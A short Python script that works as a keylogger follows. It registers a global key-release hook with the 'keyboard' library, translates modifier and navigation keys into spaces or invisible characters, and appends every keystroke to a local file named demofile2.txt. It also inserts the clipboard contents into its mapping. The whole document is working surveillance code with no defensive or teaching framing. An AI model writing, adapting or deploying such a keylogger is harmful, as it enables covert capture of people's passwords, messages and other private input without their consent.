import keyboard
import json
import clipboard

word_scape = {
  "space": " ",
  "alt gr": "‎",
  "alt grq": "‎",
  "enter": "\n",
  "shift": " ",
  "alt": "‎",
  "caps lock":"‎",
  "right": "‎",
  "left": "‎",
  "up": "‎",
  "down": "‎",
  "backspace": "‎",
  "tab": "‎",
  "scroll lock": "‎",
  "unknown": "‎",
  "ctrlv": clipboard.paste(),
  "ctrl v": clipboard.paste(),
  "ctrl": "‎",
}
def __cb__(e):
  f = open("demofile2.txt", "a")
  if(word_scape.get(e.name)):
    f.write(word_scape.get(e.name))
  else:
    f.write(e.name) 
  f.close()


def log(cb):
  keyboard.on_release(cb) 
  keyboard.wait()

log(__cb__)